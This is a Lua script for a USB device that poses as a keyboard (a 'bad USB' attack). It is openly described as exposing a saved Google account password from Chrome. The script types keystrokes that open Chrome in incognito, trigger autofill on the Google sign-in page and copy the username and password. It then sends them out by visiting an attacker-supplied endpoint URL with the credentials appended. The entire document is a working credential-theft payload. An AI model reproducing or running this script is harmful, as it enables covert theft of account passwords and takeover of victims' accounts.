---
--- Expose saved Google account password from Chrome
---
--- @module "meta"

require("common")

local kb = luausb.create({ type = "keyboard" }) --[[@as KeyboardDev]]

-- This URL will be visited with the captured password appended to the end
local endpoint = prompt{
    message="Enter the URL of the end-point to query.",
    hint="End-point URL",
    default="https://localhost/index.php?q="
}

while true do
    print("idle")

    -- poll until usb plugged in
    wait_for_state("configured")
    wait_for_detect(kb --[[@as KeyboardDev]])
    print("running")

    -- open chrome
    kb:chord(Keyboard.Mod.LSUPER, Keyboard.Key.R)
    wait(1000)
    kb:string("chrome --incognito\n")
    wait(2000)

    -- navigate to login page
    kb:string("accounts.google.com")
    -- get rid of any autofill that appears in the omnibar
    kb:press(Keyboard.Key.DELETE)
    kb:press(Keyboard.Key.ENTER)
    wait(2000)

    -- autofill username and continue
    kb:press(Keyboard.Key.DOWN);             wait(100)
    kb:press(Keyboard.Key.DOWN);             wait(100)
    kb:press(Keyboard.Key.ENTER);            wait(100)
    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.A);     wait(100)
    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.C);     wait(100)
    kb:press(Keyboard.Key.ENTER)
    wait(4000)

    -- autofill password
    kb:press(Keyboard.Key.TAB);              wait(100)
    kb:press(Keyboard.Key.SPACE);            wait(100)
    kb:chord(Keyboard.Mod.LSHIFT, Keyboard.Key.TAB);  wait(100)
    kb:press(Keyboard.Key.LEFT);             wait(100)
    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.V);     wait(100)
    kb:string("|");                 wait(100)
    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.A);     wait(100)
    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.C)
    wait(100)

    -- open new tab and navigate to query string with captured password
    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.T)
    wait(1000)
    kb:string(endpoint)
    kb:chord(Keyboard.Mod.LCTRL, Keyboard.Key.V)
    kb:press(Keyboard.Key.ENTER)
    wait(4000)

    -- close everything we opened
    kb:chord(Keyboard.Mod.LALT, Keyboard.Key.F4)
    wait(1000)

    print("done")
    wait_for_state("not-attached")

    print("disconnected")
end

